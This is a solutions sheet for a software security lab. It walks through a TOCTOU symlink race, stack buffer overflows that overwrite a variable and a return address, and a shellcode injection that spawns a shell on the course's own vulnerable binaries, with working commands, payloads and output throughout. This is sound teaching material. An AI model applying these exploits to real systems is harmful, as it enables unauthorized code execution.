# Solutions: Software Security I



## Exercise 1: Time-of-check to Time-of-use (TOCTOU)

As hinted in the exercises, the idea is to use a symbolic link and change the
target of the link between the calls to `access` and `open`.
We want to achieve the following sequence of events:

1. We create a symbolic link name `target.txt` to a file `dummy_file.txt` that
   we can read.
2. We run `./toctou target.txt`.
3. The `access` check will be successful.
4. We change the link so that `target.txt` now points to `flag.txt` instead.
5. `toctou` follows the link and prints the content of `flag.txt`.

Since it is very unlikely to get the timing right, if we change the link
manually, we write two scripts try this automatically over and over again.

The following loop changes the destination of the link `target.txt` from
`dummy_file.txt` to `flag.txt` and back (`-s` creates a symbolic link and `-f`
overwrites an existing file):
```bash
while :; do
    ln -sf dummy_file.txt target.txt
    ln -sf flag.txt target.txt
done
```
In parallel we run a second loop where we execute `toctou` with `target.txt` as
argument (`2> /dev/null` removes all error messages from the output, and `|
grep flag` filters the output for lines containing the string "flag").
```bash
while :; do
    ./toctou target.txt
done 2> /dev/null | grep flag
```
When both loops are run in parallel (e.g., in two different terminals), the
second should start printing the contents of `flag.txt`:
```
flag{success!}
flag{success!}
flag{success!}
[...]
```



## Exercise 2: Buffer Overflows

### Part 1: Overflowing a Buffer

We can enter a "name" when prompted by the program.
If the name is short enough, we are greated accordingly and nothing else happens.
```
$ ./overflow1
Please enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
!
x == 42
```
If we choose an even longer input, we may see that there is some garbage data
printed after our "name".
Moreover, the value of `x` has changed to `4141414141414141`.
Since the ASCII value of `A` is `0x41`, we know that our input has overwritten
the variable `x`.
```
$ ./overflow1
Please enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
4Ã¾!
x == 4141414141414141
```
If we choose an even longer input, the program crashes, but that is not
interesting for this exercise.

After trying a bit around, we can see that `x` is changed when we send more
than `0x28 = 40` bytes.
This tells us that the variable `x` is located `0x28 = 40` bytes after the
start of the buffer `name`.

<details>

<summary>Alternative way to find the offset</summary>

We can also look at the disassembly of the program to figure out this offset:
The buffer `name` is located at `[rbp-0x30]` and `x` is stored at `[rbp-0x8]`.
Hence, we have the `0x28` byte offset.

```
$ objdump -M intel -d overflow1

</details>

Now that we now the offset of `x`, we can overwrite it with the required value
`0x1337`.
Since `x` is a 64 bit integer and the architecture is little endian, this
corresponds to the byte sequence `b'\x37\x13\x00\x00\x00\x00\x00\x00'`
(for convenience, we can use the Python function `struct.pack('<Q', 0x1337)` to
obtain this).
```
$ python -c "import os, struct; os.write(1, b'A'*0x28 + struct.pack('<Q', 0x1337))" | ./overflow1 
Please enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7!
x == 1337
Success!
```


### Part 2: Changing the Control Flow


Now we have to overwrite the return address with the address of the function
`win`.
The program tells us the right address.
```
$ ./overflow2
win is located at 0x401156
Please enter your name: 
```
Alternatively, we can also look up the symbol in the binary, e.g., with
```
$ readelf -s overflow2 | grep win
    40: 0000000000401156    22 FUNC    GLOBAL DEFAULT   14 win
```

By looking at the disassembly of the function `vuln`, we find that the buffer
`name` is located at `[rbp-0x20]`.
```
$ objdump -M intel -d overflow2
[...]
000000000040116c <vuln>:
  40116c:       55                      push   rbp
  40116d:       48 89 e5                mov    rbp,rsp
  401170:       48 83 ec 20             sub    rsp,0x20
  401174:       48 8d 05 db ff ff ff    lea    rax,[rip+0xffffffffffffffdb]        # 401156 <win>
  40117b:       48 89 c6                mov    rsi,rax
  40117e:       48 8d 05 88 0e 00 00    lea    rax,[rip+0xe88]        # 40200d <_IO_stdin_used+0xd>

  40118d:       e8 be fe ff ff          call   401050 <printf@plt>
  401192:       48 8d 05 8a 0e 00 00    lea    rax,[rip+0xe8a]        # 402023 <_IO_stdin_used+0x23>
  401199:       48 89 c7                mov    rdi,rax
  40119c:       b8 00 00 00 00          mov    eax,0x0
  4011a1:       e8 aa fe ff ff          call   401050 <printf@plt>
  4011a6:       48 8d 45 e0             lea    rax,[rbp-0x20]         # <---- buffer `name` referenced here
  4011aa:       ba 40 01 00 00          mov    edx,0x140
  4011af:       48 89 c6                mov    rsi,rax
  4011b2:       bf 00 00 00 00          mov    edi,0x0
  4011b7:       e8 a4 fe ff ff          call   401060 <read@plt>
  4011bc:       48 8d 45 e0             lea    rax,[rbp-0x20]         # <---- and here
  4011c0:       48 89 c6                mov    rsi,rax
  4011c3:       48 8d 05 72 0e 00 00    lea    rax,[rip+0xe72]        # 40203c <_IO_stdin_used+0x3c>
  4011ca:       48 89 c7                mov    rdi,rax
  4011cd:       b8 00 00 00 00          mov    eax,0x0
  4011d2:       e8 79 fe ff ff          call   401050 <printf@plt>
  4011d7:       90                      nop
  4011d8:       c9                      leave  
  4011d9:       c3                      ret 
[...]
```
So we know that we find the saved base pointer at offset `0x20` and the return
address at offset `0x28`.
Therefore, sending a payload with the address of `win` at the right offset
results in execution of `win` (before the program crashes):
```
$ python -c "import os, struct; os.write(1, b'A'*0x28 + struct.pack('<Q', 0x401156))" | ./overflow2
win is located at 0x401156
Please enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@!
Success!
[1]    1619075 done                              python -c  | 
       1619076 segmentation fault (core dumped)  ./overflow2
```


### Bonus Part 3: Executing Shellcode


The program is almost the same as before, but in contrast to `overflow2` there
is no `win` function we can call.
Luckily, the stack of `overflow3` is now executable, so we can inject our own
code into the buffer and execute it.:
```
$ readelf -l overflow2 | grep -A1 STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
$ readelf -l overflow3 | grep -A1 STACK 
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
                                                          ^
                                                          |
                                                          E stands for "executable"
```

The code we will inject is commonly called "shellcode", since it is common to
spawn a new shell to be able to execute arbitrary commands.
One example of such a shellcode is given in the exercise.
If we assemble the code, we get the following byte sequence:
```python
shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x48\x89\xe2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05'
```

The program nicely prints us the address of the `name` buffer.
Since Address Space Layout Randomization (ASLR) randomizes the position of the
stack in memory, the address is different in each execution:
```
$ ./overflow3 
name is located at 0x7fff55c5d640
Please enter your name: Hello !
$ ./overflow3
name is located at 0x7ffdcfc67ea0
Please enter your name: Hello !
$ ./overflow3
name is located at 0x7ffcc2501fb0
Please enter your name: Hello !
```
For the purpose of this exercise, we disable ASLR, so that the address is
always the same:
```
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
$ setarch `uname -m` -R ./overflow3
name is located at 0x7fffffffd770
Please enter your name: Hello !
```


Using this address, we craft our input as follows:
First we fill the buffer with `B`s, then we overwrite the return address with (in this case) `0x7fffffffd770 + 0x30`, and finally we write the shellcode.
Here `0x30` is the offset of the shellcode in the buffer.
```
python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')"
```

When we feed this into `overflow3`, nothing visible happens:
```
$ python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')" | setarch $(uname -m) -R ./overflow3 
name is located at 0x7fffffffd770
Please enter your name: Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBÂ ÃÃ¿Ã¿Ã¿!
```
This is because a shell is spawned and immediately closed because the input stream is already closed.
To prevent this, we can use a little trick and run the exploit as follows and can execute arbitrary shell commands:
```
(python -c "import os, struct; os.write(1, b'B'*0x28 + struct.pack('<Q', 0x7fffffffd770 + 0x30) + b'\x48\x31\xC0\x50\x48\x89\xE6\x48\x89\xE2\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05')"; cat) | setarch $(uname -m) -R ./overflow3
echo "Success!" # <- this and the following commands are executed by the newly spawned shell
Success!
